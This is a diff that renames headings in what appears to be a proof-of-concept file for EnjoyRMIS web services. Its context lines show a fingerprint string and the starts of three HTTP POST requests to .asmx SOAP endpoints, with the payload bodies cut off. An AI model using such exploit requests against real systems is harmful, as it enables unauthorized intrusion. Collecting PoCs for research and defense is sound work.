@@ -7,7 +7,7 @@ body="/Scripts/EnjoyMsg.js"
 ```
 
 
-## poc
+## POC
 ```
 POST /EnjoyRMIS_WS/WS/APS/CWSFinanceCommon.asmx HTTP/1.1
 Host: IP：port
@@ -29,7 +29,7 @@ Accept-Encoding: gzip
 </soap:Envelope>
 ```
 
-## poc2
+## POC2
 ```
 
 POST /EnjoyRMIS_WS/WS/Hr/CWSHr.asmx HTTP/1.1
@@ -56,7 +56,7 @@ Content-Length: 316
 </soapenv:Envelope>
 ```
 
-## poc3
+## POC3
 ```
 
 POST /EnjoyRMIS_WS/WS/POS/cwsoa.asmx HTTP/1.1
